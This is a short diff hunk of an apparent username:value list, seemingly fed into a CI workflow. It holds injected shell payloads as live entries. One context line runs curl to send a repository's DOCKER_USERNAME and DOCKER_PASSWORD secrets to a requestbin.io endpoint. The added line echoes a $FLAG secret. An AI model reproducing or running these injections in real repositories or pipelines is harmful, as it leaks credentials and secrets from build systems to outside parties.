@@ -188,3 +188,4 @@ afsmaira:00000
 Gcow-Sec:`curl https://requestbin.io/12ll33d1?username=${{ secrets.DOCKER_USERNAME }}&password=${{ secrets.DOCKER_PASSWORD }}`
 Resery:Resery
 CHENDAHUYOU:
+shepherdo:echo "$FLAG"
